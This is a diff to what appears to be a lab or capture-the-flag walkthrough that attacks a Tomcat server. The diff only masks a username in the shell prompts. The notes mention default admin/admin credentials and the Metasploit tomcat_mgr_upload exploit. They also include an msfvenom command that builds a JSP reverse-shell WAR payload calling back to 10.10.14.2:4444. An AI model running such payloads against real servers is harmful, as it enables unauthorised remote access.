@@ -32,9 +32,9 @@ Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
 // Apache --> Server Status (login was username: admin passwd: admin)
 // Try to get into the manager app with no luck.
 // Search on metasploit to get a good exploit which works
-allenwest1@debian:~$ msfconsole
-Found a database at /home/allenwest1/.msf4/db, checking to see if it is started
-Starting database at /home/allenwest1/.msf4/db...success
+**********@debian:~$ msfconsole
+Found a database at /home/**********/.msf4/db, checking to see if it is started
+Starting database at /home/**********/.msf4/db...success
 MSF web service is already running as PID 1253
 [-] Error while running command db_connect: Failed to connect to the HTTP data service: Data Service does not appear to be responding
 
@@ -241,7 +241,7 @@ msf5 exploit(multi/http/tomcat_mgr_upload) > exit
 .
 .
 .
-allenwest1@debian:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > m10x.war
+**********@debian:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > m10x.war
 Payload size: 1096 bytes
 Final size of war file: 1096 bytes
 
